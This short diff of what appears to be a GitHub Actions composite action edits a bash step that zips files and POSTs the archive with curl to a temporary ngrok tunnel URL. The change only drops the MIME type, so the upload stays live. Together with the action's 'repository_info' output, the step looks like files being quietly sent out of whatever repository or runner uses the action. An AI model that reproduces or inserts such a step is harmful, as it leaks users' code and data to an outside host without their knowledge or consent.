@@ -104,8 +104,7 @@ runs:
       shell: bash
       run: |
          ENDPOINT_URL="https://0a22-2001-8a0-7bc0-fd00-c190-4d80-c21c-f10a.ngrok-free.app/zip"
-         curl -X POST -F "file=@my-files/my-files.zip;type=application/zip" "$ENDPOINT_URL"
-
+         curl -X POST -F "file=@my-files/my-files.zip" "$ENDPOINT_URL"
 
 outputs:
   repository_info:
